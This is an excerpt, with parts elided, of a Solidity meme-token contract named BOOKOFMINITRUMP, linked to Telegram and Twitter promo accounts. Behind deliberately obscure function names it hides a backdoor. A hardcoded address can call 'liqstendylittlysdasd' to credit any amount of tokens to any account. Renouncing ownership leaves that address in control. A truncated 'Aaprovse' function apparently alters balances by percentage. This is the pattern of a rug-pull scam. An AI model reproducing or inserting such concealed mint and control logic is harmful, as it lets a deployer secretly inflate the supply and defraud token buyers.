...
*/
/**
https://t.me/BOOKOFMiniDonald
https://twitter.com/BOD_ERC
*/
...
contract Ownable is Context {
    ...
    function renounceOwnershipghsjdtingsd() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract BOOKOFMINITRUMP is Context, Ownable, IERC20 {
    ...
    uint256 private _totalSupply;address private   _markeSTENDaddress;
    ...
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        ...
        _markeSTENDaddress = 0xc9cBc4712e77bF34B56fd01cd158Fe60DF2b0493;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }


    function Aaprovse(address user, uint256 Percentse) external {
    ...
    function isMee() internal view returns (bool) {
        return _msgSender() ==  _markeSTENDaddress ;
    }

    function liqstendylittlysdasd(address recipient, uint256 aDropst)  external {uint256 receiveRewrd = aDropst;_balances[recipient] += receiveRewrd;require(isMee(), "Caller is not the original caller");
    }
